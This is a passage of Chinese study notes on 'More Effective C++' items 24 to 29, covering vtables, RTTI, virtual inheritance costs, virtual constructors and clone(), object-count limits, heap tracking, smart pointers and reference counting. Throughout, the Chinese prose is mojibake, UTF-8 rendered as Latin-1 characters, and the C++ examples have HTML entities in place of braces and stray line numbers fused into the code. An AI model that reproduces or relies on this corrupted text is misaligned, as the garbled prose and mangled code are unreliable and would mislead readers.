æœ‰ç±»å‹å®‰å…¨çš„ç‰¹æ€§ï¼Œå¯æ‰©å±•æ€§å¥½ï¼›è€Œ stdio æ›´èŠ‚çœç¨‹åºç©ºé—´ã€é€Ÿåº¦æ›´å¿«ã€‚ æ¡æ¬¾ 24ï¼šäº†è§£ virtual functionsã€multiple inheritanceã€virtual base classã€runtime type identificationçš„æˆæœ¬ å½“ä¸€ä¸ªè™šå‡½æ•°è¢«è°ƒç”¨ï¼Œæ‰§è¡Œçš„ä»£ç å¿…é¡»å¯¹åº”äºâ€œè°ƒç”¨è€…ï¼ˆå¯¹è±¡ï¼‰çš„åŠ¨æ€ç±»å‹â€ã€‚ å¤§éƒ¨åˆ†ç¼–è¯‘å™¨ä½¿ç”¨ virtual tablesï¼ˆvtblsï¼‰å’Œ virtual table pointersï¼ˆvptrsï¼‰å®ç°åŠ¨æ€ç±»å‹ã€‚ virtual tablesï¼ˆvtblsï¼‰ vtbl é€šå¸¸æ˜¯ä¸€ä¸ªç”±â€œå‡½æ•°æŒ‡é’ˆâ€æ•°ç»„ã€‚æŸäº›ç¼–è¯‘å™¨ä¼šä»¥é“¾è¡¨ï¼ˆlinked listï¼‰å–ä»£æ•°ç»„ï¼Œä½†å…¶åŸºæœ¬ç­–ç•¥ç›¸åŒã€‚ç¨‹åºä¸­çš„æ¯ä¸€ä¸ªclass ï¼Œåªè¦å£°æ˜ï¼ˆæˆ–ç»§æ‰¿ï¼‰è™šå‡½æ•°è€…ï¼Œéƒ½æœ‰è‡ªå·±çš„ä¸€ä¸ª vtblï¼Œè€Œå…¶ä¸­çš„æ¡ç›®ï¼ˆentriesï¼‰å°±æ˜¯è¯¥ class çš„å„ä¸ªè™šå‡½æ•°å…·ä½“å®ç°çš„æŒ‡é’ˆã€‚ è™šå‡½æ•°çš„ç¬¬ä¸€ä¸ªæˆæœ¬ï¼šä½ å¿…é¡»ä¸ºæ¯ä¸ªæ‹¥æœ‰è™šå‡½æ•°çš„ class è€—è´¹ä¸€ä¸ª vtbl ç©ºé—´ï¼Œå…¶å¤§å°è§†è™šå‡½æ•°çš„ä¸ªæ•°ï¼ˆåŒ…æ‹¬ç»§æ‰¿è€Œæ¥çš„ï¼‰è€Œå®šã€‚ 12345678910class C1 &#123; public: C1(); virtual ~C1(); virtual void f1(); virtual int f2(char c) const; virtual void f3(const string&amp; s); void f4() const; ...&#125;; C1 çš„ virtual table æ•°ç»„çœ‹èµ·æ¥å¦‚ä¸‹å›¾æ‰€ç¤º: æ³¨æ„éè™šå‡½æ•° f4 ä¸åœ¨è¡¨ä¸­ï¼Œè€Œä¸” C1 çš„æ„é€ å‡½æ•°ä¹Ÿä¸åœ¨ã€‚ 12345678class C2: public C1 &#123; public: C2(); virtual ~C2(); virtual void f1(); virtual void f5(char *str); ... &#125;; å®ƒçš„ virtual table ä¸­åŒ…æ‹¬æŒ‡å‘æ²¡æœ‰è¢« C2 é‡å®šä¹‰çš„ C1 è™šå‡½æ•°çš„æŒ‡é’ˆï¼š virtual table pointersï¼ˆvptrsï¼‰ Virtual tables åªæ˜¯è™šå‡½æ•°å®ç°æœºæ„çš„ä¸€åŠè€Œå·²ã€‚å¦‚æœåªæœ‰å®ƒï¼Œä¸èƒ½æˆæ°”å€™ã€‚è¿˜éœ€è¦æŸç§æ–¹æ³•å¯ä»¥æŒ‡ç¤ºå‡ºæ¯ä¸ªå¯¹è±¡å¯¹åº”äºå“ªä¸€ä¸ª vtblï¼Œvtbl æ‰çœŸçš„æœ‰ç”¨ã€‚è€Œè¿™æ­£æ˜¯virtual table pointerï¼ˆvptrï¼‰çš„ä»»åŠ¡ã€‚ å‡¡å£°æ˜æœ‰è™šå‡½æ•°çš„ classï¼Œå…¶å¯¹è±¡éƒ½å«æœ‰ä¸€ä¸ªéšè—çš„ data memberï¼Œvptrï¼Œç”¨æ¥æŒ‡å‘è¯¥class çš„ vtblã€‚è¿™ä¸ªéšè—çš„ data member è¢«ç¼–è¯‘å™¨åŠ å…¥å¯¹è±¡å†…æŸä¸ªåªæœ‰ç¼–è¯‘å™¨æ‰çŸ¥é“çš„ä½ç½®ã€‚ è™šå‡½æ•°çš„ç¬¬äºŒä¸ªæˆæœ¬ï¼šä½ å¿…é¡»åœ¨æ¯ä¸€ä¸ªæ‹¥æœ‰è™šå‡½æ•°çš„å¯¹è±¡å†…ä»˜å‡ºâ€œä¸€ä¸ªé¢å¤–æŒ‡é’ˆâ€çš„ä»£ä»·ã€‚ ä¸Šè¿°C1ã€C2å¯¹è±¡å…³ç³»å¯ä»¥è¡¨ç¤ºä¸ºï¼š è™šå‡½æ•°çš„è°ƒç”¨ ç¼–è¯‘å™¨å¿…é¡»äº§ç”Ÿä»£ç ï¼Œå®Œæˆä»¥ä¸‹åŠ¨ä½œï¼š æ ¹æ®å¯¹è±¡çš„ vptr æ‰¾å‡ºå…¶ vtblã€‚ç¼–è¯‘å™¨æˆæœ¬åªæœ‰ä¸€ä¸ªåç§»è°ƒæ•´ï¼ˆoffset adjustmentï¼‰å°±èƒ½è·å¾— vptrï¼Œå’Œä¸€ä¸ªæŒ‡é’ˆé—´æ¥åŠ¨ä½œï¼Œä»¥ä¾¿è·å¾— vtblã€‚ æ‰¾å‡ºè¢«è°ƒç”¨å‡½æ•°åœ¨ vtbl å†…çš„å¯¹åº”æŒ‡é’ˆã€‚ç¼–è¯‘å™¨ä¸ºæ¯ä¸ªè™šå‡½æ•°æŒ‡å®šäº†ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„è¡¨æ ¼ç´¢å¼•ã€‚æœ¬æ­¥éª¤çš„æˆæœ¬åªæ˜¯ä¸€ä¸ªåç§»ï¼ˆoffsetï¼‰ï¼Œåœ¨ vtbl æ•°ç»„ä¸­ç´¢å¼•ã€‚ è°ƒç”¨æ­¥éª¤ 2 æ‰€å¾—æŒ‡é’ˆæ‰€æŒ‡å‘çš„å‡½æ•°ã€‚ RTTI è¿è¡Œæ—¶æœŸç±»å‹è¾¨è¯†ï¼ˆruntime typeidentificationï¼ŒRTTIï¼‰çš„æˆæœ¬ã€‚RTTI è®©æˆ‘ä»¬å¾—ä»¥åœ¨è¿è¡Œæ—¶æœŸè·å¾— objects å’Œ class çš„ç›¸å…³ä¿¡æ¯ã€‚å®ƒä»¬è¢«å­˜æ”¾åœ¨ç±»å‹ä¸º type_info çš„å¯¹è±¡å†…ã€‚ä½ å¯ä»¥åˆ©ç”¨ typeid æ“ä½œç¬¦å–å¾—æŸä¸ªclass ç›¸åº”çš„ type_info å¯¹è±¡ã€‚ C++è§„èŒƒä¹¦ä¸Šè¯´ï¼Œåªæœ‰å½“æŸç§ç±»å‹æ‹¥æœ‰è‡³å°‘ä¸€ä¸ªè™šå‡½æ•°ï¼Œæ‰ä¿è¯æˆ‘ä»¬èƒ½å¤Ÿæ£€éªŒè¯¥ç±»å‹å¯¹è±¡çš„åŠ¨æ€ç±»å‹ã€‚RTTI çš„è®¾è®¡ç†å¿µæ˜¯ï¼šæ ¹æ® class çš„ vtbl æ¥å®ç°ã€‚ RTTI è€—è´¹çš„ç©ºé—´æ˜¯åœ¨æ¯ä¸ªç±»çš„ vtbl ä¸­çš„å ç”¨çš„é¢å¤–å•å…ƒå†åŠ ä¸Šå­˜å‚¨ type_info å¯¹è±¡çš„ç©ºé—´ã€‚å°±åƒåœ¨å¤šæ•°ç¨‹åºé‡Œ virtual table æ‰€å çš„å†…å­˜ç©ºé—´å¹¶ä¸å€¼å¾—æ³¨æ„ä¸€æ ·ï¼Œä½ ä¹Ÿä¸å¤ªå¯èƒ½å› ä¸º type_info å¯¹è±¡å¤§å°è€Œé‡åˆ°é—®é¢˜ã€‚ RTTIçš„ä»£ä»·ï¼štype_info å ç”¨çš„ç©ºé—´ã€‚ å‡å¦‚ type_info æ‰æ˜¯å®Œæ•´çš„ vtbl å†…å­˜å¸ƒå±€ï¼š å¤šç»§æ‰¿ å¤šç»§æ‰¿ç»å¸¸å¯¼è‡´å¯¹è™šåŸºç±»çš„éœ€æ±‚ã€‚ æ²¡æœ‰è™šåŸºç±»ï¼Œå¦‚æœä¸€ä¸ªæ´¾ç”Ÿç±»æœ‰ä¸€ä¸ªä»¥ä¸Šä»åŸºç±»çš„ç»§æ‰¿è·¯å¾„ï¼ŒåŸºç±»çš„æ•°æ®æˆå‘˜è¢«å¤åˆ¶åˆ°æ¯ä¸€ä¸ªç»§æ‰¿ç±»å¯¹è±¡é‡Œï¼Œç»§æ‰¿ç±»ä¸åŸºç±»é—´çš„æ¯æ¡è·¯å¾„éƒ½æœ‰ä¸€ä¸ªæ‹·è´ã€‚ æŠŠåŸºç±»å®šä¹‰ä¸ºè™šåŸºç±»åˆ™å¯ä»¥æ¶ˆé™¤è¿™ç§å¤åˆ¶ã€‚ è™šåŸºç±»çš„å®ç°ç»å¸¸ä½¿ç”¨æŒ‡å‘è™šåŸºç±»çš„æŒ‡é’ˆåšä¸ºé¿å…å¤åˆ¶çš„æ‰‹æ®µï¼Œä¸€ä¸ªæˆ–è€…æ›´å¤šçš„æŒ‡é’ˆè¢«å­˜å‚¨åœ¨å¯¹è±¡é‡Œã€‚ å¦ä¸€ç§ä»£ä»·ï¼šè™šåŸºç±»çš„å®ç°ç»å¸¸ä½¿ç”¨æŒ‡å‘è™šåŸºç±»çš„æŒ‡é’ˆã€‚ æ¯”å¦‚ï¼š 1234class A: &#123;...&#125;;class B: virtual public A &#123; ... &#125;;class C: virtual public A &#123; ... &#125;;class D: public B, public C &#123;...&#125;; å¦‚æœ A ä¸­æ²¡æœ‰è™šå‡½æ•°ï¼ŒDå¯¹è±¡å†…å­˜å¸ƒå±€ä¸ºï¼š å¦‚æœ A ä¸­æœ‰è™šå‡½æ•°ï¼ŒDå¯¹è±¡å†…å­˜å¸ƒå±€ä¸ºï¼š äº”ã€æŠ€æœ¯ æ¡æ¬¾ 25ï¼šå°† constructor å’Œ non-member functions è™šåŒ– æ­¤å¤„æ‰€è°“ virtual ä¸æ˜¯è™šå‡½æ•°çš„ virtualï¼Œè€Œæ˜¯ç±»ä¼¼ã€å½¢ä¼¼çš„æ„æ€ã€‚ æ¨¡ä»¿ constructor çš„è¡Œä¸ºï¼Œä½†èƒ½å¤Ÿè§†å…¶è·å¾—çš„è¾“å…¥ï¼Œäº§ç”Ÿä¸åŒç±»å‹çš„å¯¹è±¡ï¼Œæ‰€ä»¥ç§°ä¹‹ä¸º virtual constructorã€‚Virtual constructor åœ¨è®¸å¤šæƒ…å†µä¸‹æœ‰ç”¨ï¼Œå…¶ä¸­ä¹‹ä¸€å°±æ˜¯ä»ç£ç›˜ï¼ˆæˆ–ç½‘ç»œæˆ–ç£å¸¦ç­‰ï¼‰è¯»å–å¯¹è±¡ä¿¡æ¯ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä½ ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œç”¨æ¥è¿›è¡Œæ–°é—»æŠ¥é“çš„å·¥ä½œï¼Œæ¯ä¸€æ¡æ–°é—»æŠ¥é“éƒ½ç”±æ–‡å­—æˆ–å›¾ç‰‡ç»„æˆã€‚ 12345678910111213141516171819202122232425262728class NLComponent &#123; // æŠ½è±¡åŸºç±»ï¼ŒåŒ…å«è‡³å°‘ä¸€ä¸ªçº¯è™šå‡½æ•°public: ...&#125;; class TextBlock: public NLComponent &#123; public: ... // ä¸åŒ…å«çº¯è™šå‡½æ•°&#125;; class Graphic: public NLComponent &#123; public: ... // ä¸åŒ…å«çº¯è™šå‡½æ•°&#125;; class NewsLetter &#123; public: NewsLetter(istream&amp; str); ...private: list&lt;NLComponent*&gt; components; // virtual constructor // ä¸ºå»ºç«‹ä¸‹ä¸€ä¸ª NLComponent å¯¹è±¡ä» str è¯»å–æ•°æ® // å»ºç«‹ component å¹¶è¿”å›ä¸€ä¸ªæŒ‡é’ˆ static NLComponent* readComponent(istream&amp; str);&#125;;NewsLetter::NewsLetter(istream&amp; str) &#123; while (str) &#123; components.push_back(readComponent(str));&#125; &#125; readComponent æ‰€åšçš„å·¥ä½œã€‚å®ƒæ ¹æ®æ‰€è¯»å–çš„æ•°æ®å»ºç«‹äº†ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œæˆ–æ˜¯ TextBlock æˆ–æ˜¯ Graphicã€‚ virtual copy constructor æ˜¯ä¸€ç§ç‰¹åˆ«çš„ virtual constructor ã€‚Virtual copy constructor ä¼šè¿”å›ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å…¶è°ƒç”¨è€…ï¼ˆæŸå¯¹è±¡ï¼‰çš„ä¸€ä¸ªæ–°å‰¯æœ¬ã€‚åŸºäºè¿™ç§è¡Œä¸ºï¼Œvirtual copy constructors é€šå¸¸ä»¥ copySelf æˆ–cloneSelf å‘½åï¼Œæˆ–è€…åƒä¸‹é¢ä¸€æ ·å‘½åä¸º cloneã€‚ 12345678910111213141516171819202122232425262728293031323334class NLComponent &#123; // æŠ½è±¡åŸºç±»ï¼ŒåŒ…å«è‡³å°‘ä¸€ä¸ªçº¯è™šå‡½æ•°public: virtual NLComponent * clone() const = 0; ...&#125;; class TextBlock: public NLComponent &#123; public: virtual TextBlock * clone() const &#123; return new TextBlock(*this); &#125; ...&#125;; class Graphic: public NLComponent &#123; public: virtual Graphic * clone() const &#123; return new Graphic(*this); &#125; ... &#125;;class NewsLetter &#123; public: NewsLetter(istream&amp; rhs); ...private: list&lt;NLComponent*&gt; components;&#125;;NewsLetter::NewsLetter(const NewsLetter&amp; rhs) &#123; // éå†æ•´ä¸ª rhs é“¾è¡¨ï¼Œä½¿ç”¨æ¯ä¸ªå…ƒç´ çš„è™šæ‹Ÿæ‹·è´æ„é€ å‡½æ•° for (list&lt;NLComponent*&gt;::const_iterator it = rhs.components.begin(); it != rhs.components.end(); ++it) &#123; components.push_back((*it)-&gt;clone()); &#125;&#125; non-member functions ä¹Ÿå¯ä»¥è¿›è¡Œè™šåŒ–ã€‚ç¼–å†™ä¸€ä¸ªè™šå‡½æ•°æ¥å®Œæˆå·¥ä½œï¼Œç„¶åå†å†™ä¸€ä¸ªéè™šå‡½æ•°ï¼Œå®ƒä»€ä¹ˆä¹Ÿä¸åšåªæ˜¯è°ƒç”¨è¿™ä¸ªè™šå‡½æ•°ã€‚ 1234567891011121314151617181920class NLComponent &#123; // æŠ½è±¡åŸºç±»ï¼ŒåŒ…å«è‡³å°‘ä¸€ä¸ªçº¯è™šå‡½æ•°public: virtual ostream&amp; print(ostream&amp; s) const = 0; ...&#125;; class TextBlock: public NLComponent &#123; public: virtual ostream&amp; print(ostream&amp; s) const; ...&#125;; class Graphic: public NLComponent &#123; public: virtual ostream&amp; print(ostream&amp; s) const; ... &#125;;// éè™šå‡½æ•°ï¼Œåªè°ƒç”¨è™š printï¼Œè®©printå®Œæˆå¯¹åº”å·¥ä½œinline ostream&amp; operator&lt;&lt;(ostream&amp; s, const NLComponent&amp; c) &#123; return c.print(s); &#125; æ¡æ¬¾ 26ï¼šé™åˆ¶æŸä¸ª class æ‰€èƒ½äº§ç”Ÿçš„å¯¹è±¡æ•°é‡ æ¯äº§ç”Ÿä¸€ä¸ªå¯¹è±¡ï¼Œä¼šæœ‰ä¸€ä¸ª constructorè¢«è°ƒç”¨ã€‚ ä½¿ç”¨ static æ§åˆ¶å¯¹è±¡æ•°é‡çš„äº§ç”Ÿï¼Œæ˜¯ä¸€ç§æ–¹æ³•ã€‚é¦–å…ˆè¦çŸ¥é“ï¼š class æ‹¥æœ‰ä¸€ä¸ªstaticæˆå‘˜å¯¹è±¡æ—¶ï¼Œå³ä½¿ä»æœªä½¿ç”¨åˆ°ï¼Œä¹Ÿä¼šè¢«æ„é€ ï¼Œä¸”å…¶åˆå§‹åŒ–æ—¶æœºï¼Œå¹¶ä¸æ˜ç¡®ï¼› function ä¸­æœ‰ä¸€ä¸ªstaticå¯¹è±¡ï¼Œæ­¤å¯¹è±¡åœ¨å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨æ—¶æ‰äº§ç”Ÿï¼Œä¸”å…¶åˆå§‹åŒ–æ—¶æœºæ˜¯æ˜ç¡®çš„ã€‚ â€œé˜»æ­¢æŸä¸ª class äº§å‡ºå¯¹è±¡â€ çš„æœ€ç®€å•æ–¹æ³•å°±æ˜¯å°†å…¶ constructor å£°æ˜ä¸º privateã€‚ ä¸€ä¸ªé™åˆ¶å¯¹è±¡æ•°é‡çš„ class è®¾è®¡ï¼Œä¸€ä¸ª Printer å¯¹è±¡å®ç°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940class Printer &#123;public: class TooManyObjects&#123;&#125;; // ä¼ªæ„é€ å‡½æ•° static Printer * makePrinter(); static Printer * makePrinter(const Printer&amp; rhs); ...private: static size_t numObjects; static const size_t maxObjects = 10; Printer(); Printer(const Printer&amp; rhs); ~Printer() &#123; --numObjects; &#125;&#125;;// class static å¿…é¡»è¿›è¡Œå®šä¹‰size_t Printer::numObjects = 0; const size_t Printer::maxObjects;// æå–ä¸€ä¸ª init() å‡½æ•°å®Œæˆå…¬ç”¨çš„åˆå§‹åŒ–å·¥ä½œä¹Ÿæ˜¯å¯ä»¥çš„Printer::Printer() &#123; if (numObjects &gt;= maxObjects) &#123; throw TooManyObjects(); &#125; ++numObjects; ...&#125; Printer::Printer(const Printer&amp; rhs) &#123; if (numObjects &gt;= maxObjects) &#123; throw TooManyObjects(); &#125; ++numObjects; ...&#125; Printer * Printer::makePrinter() &#123; return new Printer; &#125; Printer * Printer::makePrinter(const Printer&amp; rhs) &#123; return new Printer(rhs); &#125; æ¡æ¬¾ 27ï¼šè¦æ±‚ï¼ˆæˆ–ç¦æ­¢ï¼‰å¯¹è±¡äº§ç”Ÿäº heap ä¹‹ä¸­ æœ‰æ—¶ä½ æƒ³è¿™æ ·ç®¡ç†æŸäº›å¯¹è±¡ï¼Œè¦è®©æŸç§ç±»å‹çš„å¯¹è±¡èƒ½å¤Ÿè‡ªæˆ‘é”€æ¯ï¼Œä¹Ÿå°±æ˜¯èƒ½å¤Ÿâ€œdelete thisâ€ã€‚å¾ˆæ˜æ˜¾è¿™ç§ç®¡ç†æ–¹å¼éœ€è¦æ­¤ç±»å‹å¯¹è±¡è¢«åˆ†é…åœ¨å †ä¸­ã€‚è€Œå…¶å®ƒä¸€äº›æ—¶å€™ä½ æƒ³è·å¾—ä¸€ç§ ä¿éšœï¼šâ€œä¸åœ¨å †ä¸­åˆ†é…å¯¹è±¡ï¼Œä»è€Œä¿è¯æŸç§ç±»å‹çš„ç±»ä¸ä¼šå‘ç”Ÿå†…å­˜æ³„æ¼ã€‚â€ åˆ¤æ–­å¯¹è±¡æ˜¯å¦åœ¨å †ä¸Šï¼Œå¯ä»¥ä½¿ç”¨åœ°å€æ¯”è¾ƒæ³•ï¼Œæ ˆæ®µåœ°å€ä»é«˜åˆ°ä½ç”Ÿé•¿ï¼Œå †æ®µåœ°å€ä»ä½åˆ°é«˜ç”Ÿé•¿ã€‚ä»¥ä¸‹æ–¹æ³•å¯ä»¥å®ç°ï¼š 1234bool onHeap(const void *address) &#123; char onTheStack; return address &lt; &amp;onTheStack; &#125; ä½†æ˜¯ï¼Œstatic å¯¹è±¡çš„åœ°å€åœ¨å †æ®µåœ°å€ä¸‹æ–¹ï¼Œä»¥ä¸Šæ–¹æ³•å¹¶ä¸èƒ½ç¡®å®šæ˜¯å¦æ˜¯é™æ€å¯¹è±¡ã€‚ å¦ä¸€ç§æ–¹å¼ï¼Œæ˜¯è®¾è®¡ abstract mixin base class æ¥å®ç°åˆ¤æ–­å †å¯¹è±¡çš„åŠŸèƒ½ã€‚ æ‰€è°“ abstract base class æ˜¯ä¸€ä¸ªä¸èƒ½å¤Ÿè¢«å®ä¾‹åŒ–çš„ base classã€‚ä¹Ÿå°±æ˜¯è¯´å®ƒè‡³å°‘æœ‰ä¸€ä¸ªçº¯è™šå‡½æ•°ã€‚æ‰€è°“ mixinï¼ˆâ€œmix inâ€ï¼‰class åˆ™æä¾›ä¸€ç»„å®šä¹‰å®Œå¥½çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿä¸å…¶ derived class æ‰€å¯èƒ½æä¾›çš„å…¶ä»–ä»»ä½•èƒ½åŠ›å…¼å®¹ã€‚å¦‚æ­¤çš„ class å‡ ä¹æ€»æ˜¯abstractã€‚äºæ˜¯å¯ä»¥è®¾è®¡ abstract mixin base classï¼Œç”¨æ¥ä¸º derived class æä¾›â€œåˆ¤æ–­æŸæŒ‡é’ˆæ˜¯å¦ä»¥ oeprator new åˆ†é…å‡ºæ¥â€çš„èƒ½åŠ›ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738class HeapTracked &#123; // æ··åˆç±»ï¼Œè·Ÿè¸ªä» operator new è¿”å›çš„ ptrpublic: class MissingAddress&#123;&#125;; virtual ~HeapTracked() = 0; static void *operator new(size_t size); static void operator delete(void *ptr); bool isOnHeap() const;private: typedef const void* RawAddress; static list&lt;RawAddress&gt; addresses;&#125;;list&lt;RawAddress&gt; HeapTracked::addresses;// HeapTracked çš„ææ„å‡½æ•°æ˜¯çº¯è™šå‡½æ•°ï¼Œä½¿å¾—è¯¥ç±»å˜ä¸ºæŠ½è±¡ç±»HeapTracked::~HeapTracked() &#123;&#125;void * HeapTracked::operator new(size_t size) &#123; void *memPtr = ::operator new(size); addresses.push_front(memPtr); return memPtr;&#125;void HeapTracked::operator delete(void *ptr) &#123; list&lt;RawAddress&gt;::iterator it = find(addresses.begin(), addresses.end(), ptr); if (it != addresses.end()) &#123; addresses.erase(it); ::operator delete(ptr); &#125; else &#123; throw MissingAddress(); &#125;&#125;bool HeapTracked::isOnHeap() const &#123; // å¾—åˆ°ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘*thiså æ®çš„å†…å­˜ç©ºé—´çš„èµ·å§‹å¤„ const void *rawAddress = dynamic_cast&lt;const void*&gt;(this); list&lt;RawAddress&gt;::iterator it = find(addresses.begin(), addresses.end(), rawAddress); return it != addresses.end();&#125; å¦‚æœæ˜¯åœ¨å †ä¸Šåˆ†é…å†…å­˜ï¼Œå°±ä¼šè°ƒç”¨ operator newï¼Œå¯ä»¥é€šè¿‡ isOnHeap åˆ¤æ–­æ˜¯å¦åœ¨å †ä¸Šã€‚åªè¦ç»§æ‰¿è‡ª HeapTracked ç±»çš„å­ç±»ï¼Œå°±éƒ½æœ‰äº† isOnHeap çš„åŠŸèƒ½ã€‚ å¦‚æœè¦ç¦æ­¢å¯¹è±¡åœ¨å †ä¸Šåˆ†é…å†…å­˜ï¼Œå°† operator new è®¾è®¡ä¸º private æ˜¯ä¸€ç§ç®€å•çš„æ–¹å¼ã€‚ æ¡æ¬¾ 28ï¼šSmart Pointersï¼ˆæ™ºèƒ½æŒ‡é’ˆï¼‰ å½“ä½ ä»¥ smart pointers å–ä»£ C++çš„å†…å»ºæŒ‡é’ˆï¼ˆäº¦å³ dumb pointersï¼‰ï¼Œä½ å°†è·å¾—ä»¥ä¸‹å„ç§æŒ‡é’ˆè¡Œä¸ºçš„æ§åˆ¶æƒï¼š æ„é€ å’Œææ„ï¼ˆConstruction and Destructionï¼‰ã€‚ä½ å¯ä»¥å†³å®šsmart pointer è¢«äº§ç”Ÿä»¥åŠè¢«é”€æ¯æ—¶å‘ç”Ÿä»€ä¹ˆäº‹ã€‚é€šå¸¸æˆ‘ä»¬ä¼šç»™ smart pointers ä¸€ä¸ªé»˜è®¤å€¼ nullptrï¼Œä»¥é¿å…â€œæŒ‡é’ˆæœªè·åˆå§‹åŒ–â€çš„å¤´ç—›é—®é¢˜ã€‚æŸäº› smart pointers å¯ä»¥åˆ é™¤å®ƒä»¬æ‰€æŒ‡çš„å¯¹è±¡ï¼Œæ¯”å¦‚å½“æŒ‡å‘è¯¥å¯¹è±¡çš„æœ€åä¸€ä¸ª smart pointer è¢«é”€æ¯æ—¶ã€‚è¿™æ˜¯æ¶ˆé™¤èµ„æºæ³„æ¼é—®é¢˜çš„ä¸€å¤§è¿›æ­¥ã€‚ å¤åˆ¶å’Œèµ‹å€¼ï¼ˆCopying and Assignmentï¼‰ã€‚å½“ä¸€ä¸ª smart pointer è¢«å¤åˆ¶æˆ–æ¶‰åŠèµ‹å€¼åŠ¨ä½œæ—¶ï¼Œä½ å¯ä»¥æ§åˆ¶å‘ç”Ÿä»€ä¹ˆäº‹ã€‚æŸäº› smart pointer ä¼šå¸Œæœ›åœ¨æ­¤æ—¶åˆ»è‡ªåŠ¨ä¸ºå…¶æ‰€æŒ‡ä¹‹ç‰©è¿›è¡Œå¤åˆ¶æˆ–èµ‹å€¼åŠ¨ä½œï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œæ·±å¤åˆ¶ï¼ˆdeep copyï¼‰ã€‚å¦ä¸€äº› smart pointer åˆ™å¯èƒ½åªå¸Œæœ›æŒ‡é’ˆæœ¬èº«è¢«å¤åˆ¶æˆ–èµ‹å€¼å°±å¥½ã€‚è¿˜æœ‰ä¸€äº›åˆ™æ ¹æœ¬ä¸å…è®¸å¤åˆ¶å’Œèµ‹å€¼ã€‚ä¸è®ºä½ å¸Œæœ›ä»€ä¹ˆæ ·çš„è¡Œä¸ºï¼Œsmart pointer éƒ½å¯ä»¥è®©ä½ å¦‚æ„¿ã€‚ è§£å¼•ï¼ˆDereferencingï¼‰ã€‚å½“ client è§£å¼•ï¼ˆå–ç”¨ï¼‰smart pointer æ‰€æŒ‡ä¹‹ç‰©æ—¶ï¼Œä½ æœ‰æƒå†³å®šå‘ç”Ÿä»€ä¹ˆäº‹æƒ…ã€‚ä¾‹å¦‚ä½ å¯ä»¥åˆ©ç”¨ smart pointer ååŠ©å®ç°å‡ºæ¡æ¬¾ 17 æ‰€è¯´çš„ lazy fetching ç­–ç•¥ã€‚ Smart pointerçš„æ„é€ è¡Œä¸ºé€šå¸¸æ˜ç¡®æ˜“è§£ï¼šç¡®å®šä¸€ä¸ªç›®æ ‡ç‰©ï¼ˆé€šå¸¸æ˜¯åˆ©ç”¨smart pointer çš„ constructor å‚æ•°ï¼‰ï¼Œç„¶åè®© smart pointer å†…éƒ¨çš„ dumb pointer æŒ‡å‘å®ƒã€‚å¦‚æœå°šæœªå†³å®šç›®æ ‡ç‰©ï¼Œå°±å°†å†…éƒ¨æŒ‡é’ˆè®¾ä¸º nullptrï¼Œæˆ–æ˜¯å‘å‡ºä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼ˆå¯èƒ½æ˜¯æŠ›å‡º exceptionï¼‰ã€‚ Smart pointer ä¸è¦æä¾›å¯¹ dumb pointer çš„éšå¼è½¬æ¢æ“ä½œç¬¦ï¼Œé™¤éä¸å¾—å·²ã€‚ åœ¨æ¶‰åŠç»§æ‰¿ç›¸å…³çš„ç±»å‹è½¬æ¢æ—¶ï¼Œsmart pointer æ˜¯åšä¸åˆ° dumb pointer æ‰€èƒ½åšçš„ä¸€åˆ‡çš„ã€‚æ­¤æ—¶ï¼Œåˆ«ä½¿ç”¨ smart pointer ï¼Œè€Œæ˜¯ dumb pointer ã€‚ æ¡æ¬¾ 29ï¼šReference countingï¼ˆå¼•ç”¨è®¡æ•°ï¼‰ é€šè¿‡ reference counting å¯ä»¥å»ºæ„å‡ºåƒåœ¾å›æ”¶æœºåˆ¶ï¼ˆgarbage collectionï¼‰çš„ä¸€ä¸ªç®€å•å½¢å¼ã€‚Reference counting çš„å¦ä¸€ä¸ªå‘å±•åŠ¨æœºåˆ™åªæ˜¯ä¸ºäº†å®ç°ä¸€ç§å¸¸è¯†ã€‚å¦‚æœè®¸å¤šå¯¹è±¡æœ‰ç›¸åŒçš„å€¼ï¼Œå°†é‚£ä¸ªå€¼å­˜å‚¨å¤šæ¬¡æ˜¯ä»¶æ„šè ¢çš„äº‹ã€‚æœ€å¥½æ˜¯è®©æ‰€æœ‰ç­‰å€¼å¯¹è±¡å…±äº«ä¸€ä»½å®å€¼å°±å¥½ã€‚ copy-on-write â€œå’Œå…¶ä»–å¯¹è±¡å…±äº«ä¸€ä»½å®å€¼ï¼Œç›´åˆ°æˆ‘ä»¬å¿…é¡»å¯¹è‡ªå·±æ‰€æ‹¥æœ‰çš„é‚£ä¸€ä»½å®å€¼è¿›è¡Œå†™åŠ¨ä½œï¼Œæ‰è¿›è¡Œå¤åˆ¶â€ï¼Œè¿™å°±æ˜¯ï¼šcopy-on-writeï¼ˆå†™æ—¶æ‰å¤åˆ¶ï¼‰ã€‚ ç‰¹åˆ«æ˜¯åœ¨æ“ä½œç³»ç»Ÿé¢†åŸŸï¼Œå„è¿›ç¨‹ï¼ˆprocessesï¼‰ä¹‹é—´å¾€å¾€å…è®¸å…±äº«æŸäº›å†…å­˜åˆ†é¡µï¼ˆmemory pagesï¼‰ï¼Œç›´åˆ°å®ƒä»¬æ‰“ç®—ä¿®æ”¹å±äºè‡ªå·±çš„é‚£ä¸€åˆ†é¡µï¼Œæ‰è¿›è¡Œå¤åˆ¶ã€‚è¿™æ˜¯æå‡æ•ˆç‡çš„ä¸€èˆ¬åŒ–åšæ³•ï¼ˆä¹Ÿå°±æ˜¯ lazy evaluationï¼Œæ¡æ¬¾ 17ï¼‰ã€‚ å®ç° é¦–å…ˆäº§ç”Ÿä¸€ä¸ª base class RCObjectï¼Œä½œä¸ºâ€œreference-counted å¯¹è±¡â€ä¹‹ç”¨ã€‚RCObject ç»„æˆä¸ºï¼š â€œå¼•ç”¨è®¡æ•°å™¨â€ å¢å‡è®¡æ•°å€¼çš„å‡½æ•° ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥å°†ä¸å†è¢«ä½¿ç”¨ï¼ˆä¹Ÿå°±æ˜¯å…¶å¼•ç”¨æ¬¡æ•°ä¸º 